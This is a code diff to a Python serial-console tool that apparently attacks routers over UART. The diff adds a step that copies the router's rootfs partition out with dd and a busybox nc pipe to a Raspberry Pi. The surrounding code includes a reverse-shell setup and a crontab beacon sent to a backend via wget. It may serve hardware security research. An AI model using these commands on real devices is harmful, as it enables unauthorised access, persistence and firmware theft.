@@ -12,12 +12,13 @@ init(autoreset=True)  # Colorama autoreset
 
 
 DEV_SERIAL_PORT = "/dev/ttyS0"
+BACKEND_ENDPOINT = "http://192.168.31.108:5000/updateGet"
 
 REVERSE_SHELL_IP   = "10.0.0.149"
 REVERSE_SHELL_PORT = 4444
 
 DEVICE_CONFIG = {"name":"router_asus2", "status":"ON", "shellIP":REVERSE_SHELL_IP, "shellPort":REVERSE_SHELL_PORT}
-BACKEND_ENDPOINT = "http://192.168.31.108:5000/updateGet"
+
 
 
 def read_data(ser):
@@ -154,7 +155,7 @@ def check_if_terminal(ser):
 
 
 def title():
-    print(Fore.MAGENTA + """                                                                       
+    print(Fore.CYAN + """                                                                       
 8888888b.        888     888       d8888 8888888b. 88888888888 
 888   Y88b       888     888      d88888 888   Y88b    888     
 888    888       888     888     d88P888 888    888    888     
@@ -229,7 +230,11 @@ def extract_rootfs(ser):
     """
         Extracts the rootfs partition from the device to /tmp/rootfs.bin (on the device)
     """
-
+    
+    print()
+    print(Fore.CYAN + "+------------------------+")
+    print(Fore.CYAN + "|   EXTRACTING ROOTFS    |")
+    print(Fore.CYAN + "+------------------------+")
     print("\n● Extracting rootfs partition to /tmp/rootfs.bin.... ", end="")
 
     try:
@@ -254,6 +259,17 @@ def extract_rootfs(ser):
                         send_command(ser, "dd if=/dev/" + partition_block + " of=/tmp/" + name + ".bin bs=4096")
 
                         print(Fore.GREEN + "Extraction completed ✓\n")
+        
+        
+        network_status, rpi_ip = check_networking(ser)
+        
+        if network_status: 
+            send_command(ser, "cat /tmp/rootfs.bin | /tmp/busybox_el nc {} {}".format(rpi_ip, 4445))
+            print(Fore.GREEN + "rootfs.bin copied to Raspberry ✓\n")
+            
+        else:
+            print(Fore.RED + " ------> Error copying rootfs.bin to Raspberry X:\n" + error)
+
 
     except Exception as error:
         print(Fore.RED + " ------> Error during process X:\n" + error)
@@ -288,7 +304,7 @@ def check_networking(ser):
     
     
     except Exception as error:
-        print(Fore.RED + "Error getting device ip")
+        print(Fore.RED + "Error getting device IP")
         print(error)
 
 
@@ -341,31 +357,6 @@ def copy_file(ser, file_path, final_path):
         print(error)
 
 
-"""
-def copy_busybox(ser):
-    
-    #    Copy the busybox binary to the router via wget from the router to the raspi /var/www/html
-    
-    print()
-    print(Fore.YELLOW + "+------------------------+")
-    print(Fore.YELLOW + "|    COPYING BUSYBOX     |")
-    print(Fore.YELLOW + "+------------------------+")
-    
-    network_status, rpi_ip = check_networking(ser)
-
-    try:
-        copyfile("./binaries/busybox-mipsel", "/var/www/html/busybox_mipsel")
-
-        if check_web_server() and network_status:
-            send_command(ser, "wget -O /tmp/busybox_el http://{}/busybox_mipsel".format(rpi_ip))
-            send_command(ser, "chmod +x /tmp/busybox_el")
-            print(Fore.GREEN + "-----> Busybox copied succesfully ✓")
-
-    except Exception as error:
-
-        print(Fore.RED + "Error pushing busybox file, error -> ")
-        print(error)
-"""
 
 def get_reverse_shell(ser):
     """
@@ -401,7 +392,6 @@ def config_crontab(ser):
         infofile.write('wget -O- "{}?'.format(BACKEND_ENDPOINT))
         
         for field in DEVICE_CONFIG:
-            print(field)
             infofile.write("{}={}&".format(field, DEVICE_CONFIG[field]))
             
         infofile.write('"')
@@ -458,9 +448,13 @@ def test_mode():
 
         if check_if_terminal(ser):
             
-            get_info(ser)            
+            get_info(ser)
+            print(Back.CYAN + "\n")
             get_reverse_shell(ser)
-            config_crontab(ser)           
+            print(Back.CYAN + "\n")
+            config_crontab(ser)
+            print(Back.CYAN + "\n")
+            extract_rootfs(ser)
             
             response = input("\n● Do you want to open the terminal? (Y/N) ")
 
@@ -500,7 +494,7 @@ def direct_terminal_mode():
             print(Fore.RED + "No baudrate value provided \n\n")
         
         else:    
-            print(Fore.RED + "No baudrate valid value ({} type instead of interger) \n\n".format(type(baudrate)))
+            print(Fore.RED + "No baudrate valid value ({} type instead of integer) \n\n".format(type(baudrate)))
             print(Fore.YELLOW + str(error))
 
 
@@ -520,17 +514,17 @@ def main():
 
     title()
 
+    try:
+        if sys.argv[1] == "-t" or sys.argv[1] == "--terminal":
+            direct_terminal_mode()
 
-    if sys.argv[1] == "-t" or sys.argv[1] == "--terminal":
-        direct_terminal_mode()
-
-    elif sys.argv[1] == "-d" or sys.argv[1] == "--debug":
-        test_mode()
-            
-    elif sys.argv[1] == "-a" or sys.argv[1] == "--automode":
-        auto_mode()
+        elif sys.argv[1] == "-d" or sys.argv[1] == "--debug":
+            test_mode()
+                
+        elif sys.argv[1] == "-a" or sys.argv[1] == "--automode":
+            auto_mode()
         
-    else:
+    except:
         print_usage()
         
 
